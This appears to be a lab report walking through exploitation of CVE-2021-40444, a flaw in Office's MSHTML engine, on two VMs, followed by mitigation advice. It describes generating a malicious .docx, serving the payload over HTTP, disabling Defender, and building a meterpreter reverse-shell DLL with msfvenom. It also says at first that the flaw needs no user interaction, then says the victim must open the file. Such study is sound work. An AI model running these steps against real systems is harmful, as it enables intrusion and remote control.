									Vulnerability Exploitation</h1>
							<section>
								<h3>Introduction</h3>
									<p>This report provides an in-depth analysis of CVE-2021-40444, a critical remote code execution vulnerability discovered in the Microsoft Office ActiveX Control. The objective is to thoroughly understand the technical aspects, impact on affected systems, and real-world existence of this vulnerability. This report will also include a detailed plan for exploiting the vulnerability.</p>

									<p>CVE-2021-40444 emerged as a critical security vulnerability in September 2021, drawing significant attention from the cybersecurity community. The vulnerability is rated as critical because it can be exploited remotely without user interaction. This means an attacker can exploit the vulnerability without tricking the victim into clicking on a malicious link or opening a malicious attachment. At its core, this vulnerability targets the MSHTML browser engine, also known as Trident, responsible for rendering web content within Microsoft Office applications.</p>
									
									<p>The vulnerability is exploited when a victim is deceived into opening a specially crafted Office document or previewing it in the Windows Preview pane. The document contains an embedded object that references a malicious script. Once executed, this script takes advantage of the vulnerability within the MSHTML engine, enabling remote code execution. Successful exploitation of CVE-2021-40444 could lead to complete system compromise, permitting the attacker to install malware, steal sensitive information, or gain unauthorized access to the targeted system.</p>

							<section>
								<h3>Explanation and Documentation of Vulnerability</h3>
									<p>The vulnerability, CVE-2021-40444, stems from a flaw in handling objects by the MSHTML engine in Microsoft Office. When encountering an object within an Office document, MSHTML attempts to load it using the object's URL. However, if the URL points to a malicious script, MSHTML proceeds to download and execute the script. This vulnerability occurs while parsing malicious ActiveX controls embedded within Office documents. ActiveX controls are technology components that enhance functionality in applications like Internet Explorer and Windows.</p>

									<p>Exploiting this vulnerability involves crafting a specially designed Office document with an object pointing to a malicious script. When the victim opens the document, the malicious script is executed by MSHTML. Consequently, the attacker can install malware on the victim's computer, exfiltrate sensitive information, or take full control of the compromised system.</p>

									<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture1.png" alt="Fig.1: Attack chain of CVE-2021-40444" width="300px" /></a>
									<strong>Fig.1: Attack chain of CVE-2021-40444</strong>
									</div></br>

									<p>CVE-2021-40444 impacts various versions of Microsoft Office, including 2010, 2013, 2016, 2019, and Microsoft 365. It resides within the ActiveX control utilized by the MSHTML engine, responsible for rendering and displaying HTML content within Office applications.</p>
									
									<p>The vulnerability originates from how the MSHTML engine handles objects in memory, particularly concerning processing specially crafted Office documents. An attacker can create a malicious document, such as a Word or PowerPoint file, that embeds a carefully crafted ActiveX control. When a user opens the manipulated document, the MSHTML engine fails to adequately validate and handle the embedded ActiveX control, allowing the execution of arbitrary code with the user's privileges.</p>
									
									<p>The attack chain for CVE-2021-40444 is as follows:</p>

									<p>1. The attacker crafts a specially designed Office document, such as a Word or PowerPoint file containing an embedded ActiveX control pointing to a malicious script.</p>

									<p>2. The victim receives and opens the malicious document using a vulnerable version of Microsoft Office (2010, 2013, 2016, 2019, or Microsoft 365).</p>

									<p>3. The MSHTML engine, responsible for rendering HTML content within Office applications, attempts to load the embedded ActiveX control referenced in the document.</p>

									<p>4. The MSHTML engine fails to adequately validate and handle the ActiveX control, allowing the execution of arbitrary code with the user's privileges.</p>

									<p>5. The malicious script within the ActiveX control is downloaded and executed by the MSHTML engine.</p>

									<p>6. As a result, the attacker gains various capabilities, including the ability to remotely execute arbitrary commands, install malware, access sensitive information without authorization, or potentially achieve a complete compromise of the victim's system.</p>

									<p>7. The extent of the attacker's access depends on the user’s privileges opening the document, potentially allowing them to gain control over the entire system.</p>

									<p>Successful exploitation of CVE-2021-40444 can have severe consequences. By successfully exploiting this vulnerability, an attacker can gain various capabilities and levels of access. They can remotely execute arbitrary commands, allowing them to control the victim's system and execute malicious actions. This includes installing malware, such as keyloggers or ransomware, which can lead to unauthorized access to sensitive information or even the encryption of critical data. Additionally, the attacker can exfiltrate valuable data from the compromised system, such as login credentials, financial information, or intellectual property. In some cases, the attacker can ultimately compromise the targeted system, obtaining complete control. The level of access obtained depends on the user’s privileges that open the document, potentially enabling the attacker to gain control over the entire system.</p><br/>

									<strong>Fig.2: Breakdown of exploit</strong>
								</div>
								<p><strong>Function `generate_payload()` is defined.</strong><br/><br/>
									The script reads the second and third command-line arguments (<strong>sys.argv[2]</strong> and <strong>sys.argv[3]</strong>) and assigns them to <strong>payload_path</strong> and <strong>srv_url</strong>, respectively. These arguments are used to specify the path of the DLL payload file and the HTML exploit URL.<br/><br/>
									The function then prints the specified options (DLL payload path and HTML exploit URL) to the console.<br/><br/>
									The script attempts to read the content of the DLL payload file specified by <strong>payload_path</strong>. If successful, it creates a new file named "word.dll" in the "data" directory and writes the content of the payload into it. If the DLL payload file is not found, an error message is printed, and the script exits.<br/><br/>
									The script executes a command (<strong>execute_cmd</strong>) to copy the content of the "data/word_dat/" directory to a new directory named "data/tmp_doc/."<br/><br/>
									The script prints a message indicating that it is writing the HTML Server URL. Then, it opens the "document.xml.rels" file inside the "data/tmp_doc/word/_rels/" directory and reads its content into the variable <strong>xml_content</strong>.
								</p>	
									
								<div style="text-align: center;">

									<strong>Fig.3: Breakdown of exploit</strong>
								</div>
										The script replaces the placeholder <strong><EXPLOIT_HOST_HERE></strong> in the <strong>xml_content</strong> variable with the HTML exploit URL (<strong>srv_url + '/word.html'</strong>) provided in the command-line argument. Then, it writes the updated content back to the "document.xml.rels" file.<br/><br/>
										The script prints a message indicating that it is generating a malicious docx file. Then, it changes the current working directory to "data/tmp_doc/." Next, it uses the zip command to compress all the files and directories in the "data/tmp_doc/" directory into a new file named "document.docx." The "document.docx" file is then copied to the "out" directory. After that, the "tmp_doc" directory is removed, and the script goes back to the parent directory.<br/><br/>
									

									<strong>The script prints a message indicating that it is generating a malicious CAB file.</strong> It changes the current working directory to "data/" and creates a new directory named "cab/." The "word.dll" and "msword.inf" files are copied into the "cab/" directory. Next, it executes the lcab command to create a CAB file named "out.cab" from the "msword.inf" file. The "out.cab" file is then patched, and a new file named "word.cab" is created inside the "srv/" directory. After these operations, the "word.dll," "msword.inf," and "cab/" directories are removed, and the script goes back to the parent directory.</p>

										The script prints a message indicating that it is updating information on the HTML exploit. It changes the current working directory to "srv/" and copies the "backup.html" file to "word.html." Next, it reads the content of "word.html" into the variable <strong>exploit_content</strong> and replaces the placeholder <strong>&lt;HOST_CHANGE_HERE&gt;</strong> with the path to the generated "word.cab" file. Finally, the updated <strong>exploit_content</strong> is written back to "word.html," and the script goes back to the parent directory.

								<h3>Documentation for setting up the test environment</h3>
								<p>To demonstrate the CVE-2021-40444 vulnerability, it is necessary to set up a test environment consisting of
									a Windows 10 VM and a Kali Linux VM. Below are the prerequisites required for this demonstration.</p>
								<p><strong>Prerequisites:</strong></p>
									
									<li><strong>Windows 10 VM</strong> – This VM would act as the “Victim” machine.</li>
									<li><strong>Kali Linux VM</strong> – This VM would act as the “Attacker” machine.</li>
									<li><strong>Microsoft Office</strong> – This vulnerability requires Microsoft Office installed. In this demonstration, Microsoft Word would be used to open the document. (Things to note: Set the Microsoft Office app to be the default application for the document type. We found that manually selecting Microsoft Word to open the document did not result in successful exploitation, but once it was configured as the default application, calc.exe was executed.)</li>
									<li><strong>Microsoft Defender</strong> - Disable Microsoft Defender to ensure this is not preventing the exploit from working.</li>
									<li><strong>Lcab</strong> - Installed on the Linux machine to create the document. This can be done using the command “sudo apt-get install lcab”.</li>
									
									
									<h3>Steps in setting up the test environment:</h3>
									<table>
									  <tr>
										<th>Host</th>
										<th>Username</th>
										<th>Password</th>
									  </tr>
									  <tr>
										<td>Windows 10 (Victim)</td>
										<td>user</td>
										<td>user</td>
									  </tr>
									  <tr>
										<td>Kali Linux VM (Attacker)</td>
										<td>kali</td>
										<td>kali</td>
									  </tr>
									</table>
									
									<p>After installing and setting up the VM, we would then need to make sure that the network configuration for both VMs are correctly done up.</p>
									
									<p>Making sure Network Adapter is enabled and set to “Bridged Adapter”. By using the Bridged Adapter network mode, we can simulate a network environment where the VMs are treated as separate entities on the network, facilitating the necessary network interactions required for the exploit demonstration.</p>
									
									<div style="text-align: center;">

										<strong>Fig.7: Kali Linux VM network setting</strong>
									</div>
									
									<p>Next, we should verify the connectivity, to do this we need to make sure Windows 10 VM is able to ping the Kali Linux VM successfully. This can be done by opening command prompt and using the command “ping &lt;Kali Linux IP&gt;”. If the ping is successful, this shows that the Windows 10 VM can communicate with the Kali Linux VM.</p>

										<strong>Fig.9: Victim VM able to ping Attacker VM</strong>
									</div>
									
									<p>After configuring and setting up the VMs are successful, we can then start cloning the GitHub repository, which contains the exploit code, to the Attacker VM. Using this command “git clone https://github.com/lockedbyte/CVE-2021-40444”</p>

										<strong>Fig.12: Navigate to CVE-2021-40444</strong>
									</div>
									
									<p>Generating the malicious document by running the exploit script. In this case, we would be using the following script: python3 exploit.py generate test/calc.dll http://&lt;LinuxIP&gt;. To break it down, this script would run the exploit.py which is the name of the Python script that contains the code for CVE-2021-40444. Generate is the command that instructs it to generate the malicious documents. Test/calc.dll specifies the path and name of the DLL (Dynamic Link Library) to be used. Which in this demonstration is the “calc.dll” which is the Calculator. The purpose of using "calc.dll" is to demonstrate that the exploit is successful and can execute arbitrary code on the target system. While in the real world scenarios, it would be replaced with a malicious payload. Lastly, http://&lt;LinuxIP&gt;, the URL where the malicious document will make requests to fetch additional files required for the exploit.</p>

										<strong>Fig.13: Generating CVE-2021-40444 malicious document</strong>
									</div>
									
									<p>If the exploit is executed successfully, a new file named "document.docx" will be generated in the "/out" directory. This "document.docx" file is the one that needs to be opened on the Windows machine as part of the exploitation process.</p>
									
									<div style="text-align: center;">
										<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture14.png" alt="Fig.14: document.docx successfully created" width="300px" /></a>
										<strong>Fig.14: document.docx successfully created</strong>

								<h3>Demonstration of the exploit in action</h3>
								<p>With the successful creation of the malicious words document (document.docx), we can now transfer the malicious document to our Victim VM. In a real-world scenario, this would usually be done through emails, downloads, cloud services or etc. For this demonstration purpose, we would be using the Shared Folder function of Oracle VirtualBox to transfer the document.</p>

								<div style="text-align: center;">
									<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture15.png" alt="Fig.15: Transferring of document.docx to shared folder" width="300px" /></a>
									<strong>Fig.15: Transferring of document.docx to shared folder</strong>
								</div>

									<p>Now we have access to the malicious file, document.docx on our Victim VM. Next, we would use the command “sudo python3 exploit.py host 80” on our Attacker VM.</p>

									<div style="text-align: center;">
										<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture16.png" alt="Fig.16: Starting a HTTP server" width="300px" /></a>
										<strong>Fig.16: Starting a HTTP server</strong>
									</div>

									<p>This starts an HTTP server on the Linux machine. This server is essential for serving the required files, namely "word.html" and "word.cab," to the Windows machine during the exploit.</p>

									<p>By running the HTTP server, the Linux machine acts as a host, making these files accessible to the Windows machine when the malicious "document.docx" file is opened. This communication between the two machines is crucial for the successful execution of the exploit, as the Word document relies on these files to carry out the code execution and deliver the payload.</p>

									<p>Open the "document.docx" file on the Windows machine.</p>

									<p>Once we open the "document.docx" file on the Windows machine, we will observe requests being sent from the Windows machine to the Linux machine. These requests are made to fetch the "word.html" and "word.cab" files. If the exploit is successful, you will see the Calculator application appearing on the Windows machine. This indicates that the code execution has been accomplished effectively.</p>

										<strong>Fig.17: Calculator app pop out</strong>
									</div>

									<p>From the screenshot below, we can see the “word.cab” and “word.html” being requested</p>

										<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture18.png" alt="Fig.18: .cab and .html files are being requested by malicious file" width="300px" /></a>
										<strong>Fig.18: .cab and .html files are being requested by malicious file</strong>
									</div>

									<h3>Getting Reverse Shell:</h3>

									<p>We can create a malicious DLL (Dynamic Link Library) that allows us to execute system commands and gain a reverse shell on the Kali VM. By crafting this DLL, we can establish a connection from the compromised system (Windows machine) to the attacker's machine (Kali VM) and gain control over the compromised system. To do this we would use msfvenom to generate a malicious payload.</p>

									<p>Using the command “msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 lhost=&lt;Attacker IP&gt; lport=4444 -f dll -o test/revshell.dll”</p>

									<div style="text-align: center;">
										<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture19.png" alt="Fig.19: Malicious payload created" width="300px" /></a>
										<strong>Fig.19: Malicious payload created</strong>
									</div>

									<p>We would then generate the document.docx file again using “python3 exploit.py generate test/revshell.dll http://192.168.1.95”</p>

									<div style="text-align: center;">
										<a href="#" class="image fit"><img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture20.png" alt="Fig.20: New document.docx file created" width="300px" /></a>
										<strong>Fig.20: New document.docx file created</strong>
									</div>

									<p>To initiate the remote code execution, we need to launch the multi-handler through the msfconsole. This is necessary because we are using the meterpreter payload. By starting the msfconsole and utilizing the “exploit/multi/handler” module, we can establish a connection with the compromised system and handle the incoming meterpreter session.</p>

								<h3>Mitigation and prevention strategies for the exploit</h3>
								<p>CVE-2021-40444 MSHTML allows attackers to execute arbitrary code remotely through specially crafted Microsoft Office documents, potentially leading to unauthorized access, data theft, or system compromise.</p>

								<p>Application Guard is a Microsoft feature that opens attachments in a secure container isolated from the rest of your data. When Office opens files in Application Guard, they can be fully interacted with from inside this container unless it is manually removed back into the wider operating system. Application Guard is a great feature but is only available for enterprise customers with (pricey) E5 or E5 Security + Mobility licenses, so did not factor into this testing and likely isn’t something available to a lot of Office users. The version I used for testing was Microsoft 365 Personal, which does not have the full suite of enterprise features that Microsoft provides (<a href="https://support.microsoft.com/en-us/topic/application-guard-for-office-5e3499e0-a6dc-4c5c-86c9-048f38e930d3">Application Guard for Office - Microsoft Support</a>).</p>

								<p>Protected View is a feature in all versions of Office that essentially only allow read access to the files contents with most editing functions disabled unless the user chooses to enable it (<a href="https://support.microsoft.com/en-us/topic/what-is-protected-view-b892dc2f-d3e8-4d4c-a388-e27b50e72874">What is Protected View? - Microsoft Support</a>). Protected View is enabled by default in Word but only factors when a document is opened that meets one of the following criteria:</p>

								
								<li>Files originating from the Internet.</li>
								<li>Files that are in potentially unsafe locations (e.g., Temp folders).</li>
								<li>Files that are Outlook attachments.</li>
								<br/>
								  
								<p><strong>Following are effective strategies to mitigate and prevent this vulnerability from being exploited:</strong></p>

								<p>1. <strong>Keep software up to date</strong>: Regularly update all Microsoft products, including Windows and Office, to the latest available versions. This ensures that your systems are protected against emerging threats.</p>

								<p>2. <strong>Deploy security patches</strong>: Ensure that all systems and applications are promptly updated with the latest security patches. Microsoft frequently releases patches for known vulnerabilities, and it is crucial to apply them as soon as possible (<a href="https://nvd.nist.gov/">NVD – Home</a>).</p>
								<div style="text-align: center;">
									<img src="CVE-2021-40444 VULNERABILITY EXPLOITATION/Picture23.png" alt="Fig.23: Microsoft Patches for CVE-2021-40444" width="300px" />
									</br><strong>Fig.23: Microsoft Patches for CVE-2021-40444</strong>
								</div>

								<p>3. <strong>Implement security best practices</strong>: Organizations should follow security best practices for operating systems, applications, and network infrastructure. This includes restricting user privileges, enabling firewall protection, implementing strong passwords, and regularly auditing system logs for suspicious activities (<a href="https://msrc-blog.microsoft.com/2021/09/07/security-update-guide/">Security Update Guide - Microsoft Security Response Center. 2021, September 7</a>).</p>

								<p>4. <strong>Enable Protected View in Microsoft Office</strong>: Configure Microsoft Office applications to open documents in “Protected View” by default. This setting helps isolate potentially unsafe content and prevents the execution of active content, thereby reducing the risk of exploitation through malicious Office documents (<a href="https://www.microsoft.com/security/blog/2023/01/12/analyzing-attacks-that-exploit-the-cve-2021-40444-mshtml-vulnerability/">Intelligence, M. T. (2023). Analyzing attacks that exploit the CVE-2021-40444 MSHTML vulnerability. Microsoft Security Blog</a>).</p>

								<p>5. <strong>Disable ActiveX Controls</strong>: Organizations should disable the use of ActiveX controls in Internet Explorer and other web browsers that may utilize the MSHTML engine. ActiveX controls have been a common target for exploitation, and disabling them can mitigate the risk of attacks that leverage this vulnerability (<a href="https://www.microsoft.com/security/blog/2023/01/12/analyzing-attacks-that-exploit-the-cve-2021-40444-mshtml-vulnerability/">Intelligence, M. T. (2023). Analyzing attacks that exploit the CVE-2021-40444 MSHTML vulnerability. Microsoft Security Blog</a>).</p>

								<p>6. <strong>Utilize Enhanced Mitigation Experience Toolkit (EMET)</strong>: Microsoft’s Enhanced Mitigation Experience Toolkit (EMET) helps strengthen the security of applications by applying various security mitigations. Although Microsoft officially ended support for EMET in 2018, it may still offer additional protection against some exploitation techniques (<a href="https://www.securityfocus.com/">SecurityFocus</a>).</p>

								<p>7. <strong>Educate and train users</strong>: Organizations should conduct regular cybersecurity training for employees to raise awareness about the risk associated with phishing emails and malicious attachments. Teach them to identify suspicious content and encourage reporting of any potential security incidents (<a href="https://msrc-blog.microsoft.com/2021/09/07/security-update-guide/">Security Update Guide - Microsoft Security Response Center. 2021, September 7</a>).</p>

								<p>8. <strong>Implement Email filtering and content scanning</strong>: Organizations should use robust email filtering and content scanning solutions to detect and block malicious attachments containing exploits like CVE-2021-40444. These tools can help intercept and quarantine potentially harmful content before it reaches end-users (<a href="https://www.securityfocus.com/">SecurityFocus</a>).</p>
